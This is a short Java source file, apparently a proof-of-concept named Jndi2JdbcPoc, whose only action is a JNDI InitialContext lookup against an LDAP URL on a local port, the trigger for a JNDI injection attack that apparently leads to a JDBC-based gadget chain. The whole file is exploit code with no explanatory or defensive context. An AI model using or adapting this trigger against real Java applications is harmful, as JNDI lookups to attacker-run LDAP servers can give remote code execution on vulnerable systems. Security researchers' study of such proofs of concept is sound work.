package com.example;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Jndi2JdbcPoc {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:1388/fd611c");
    }
}
